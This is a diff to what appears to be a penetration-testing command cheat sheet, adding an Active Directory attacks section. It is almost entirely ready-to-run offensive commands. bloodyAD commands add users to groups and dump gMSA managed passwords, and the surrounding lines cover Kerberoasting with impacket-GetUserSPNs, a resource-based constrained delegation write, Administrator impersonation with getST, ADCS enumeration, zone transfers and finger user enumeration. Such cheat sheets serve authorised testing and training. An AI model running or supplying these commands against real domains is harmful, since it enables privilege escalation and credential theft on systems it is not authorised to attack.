@@ -429,7 +429,13 @@ dig axfr @$TARGET $DOM
 finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
+[*] AD
++---------- Active Directory Attacks ----------+
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
+
 [*] ADCS
++---------- AD Certificate Services Attacks ----------+
 chromium http://$TARGET/certsrv
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
@@ -480,8 +486,6 @@ impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
 impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME':'$PASSWORD' 2>/dev/null
-
-bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
 
 +---------- Ticket Attacks ----------+
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
